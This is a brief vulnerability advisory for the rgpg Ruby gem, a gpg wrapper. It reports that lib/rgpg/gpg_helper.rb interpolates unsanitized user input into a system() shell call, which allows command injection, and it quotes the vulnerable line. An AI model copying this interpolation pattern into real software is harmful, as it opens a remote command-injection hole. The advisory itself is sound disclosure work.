   Description: A simple Ruby wrapper around gpg command for file
   encryption. rgpg is a simple API for interacting with the gpg tool. It
   is specifically designed to avoid altering global keyring state by
   creating temporary public and secret keyrings on the fly for encryption
   and decryption.
   Vulnerability:
   The following code snippet does not sanitize user supplied input before
   passing it to the System () function for execution. If this ApI is used
   in the context of a rails application remote commands can be injected
   into the shell. in lib/rgpg/gpg_helper.rb: 68 begin 69 outputfile.close
   70 result = system("#{commandline} > #{output_file.path} 2>&1") 71
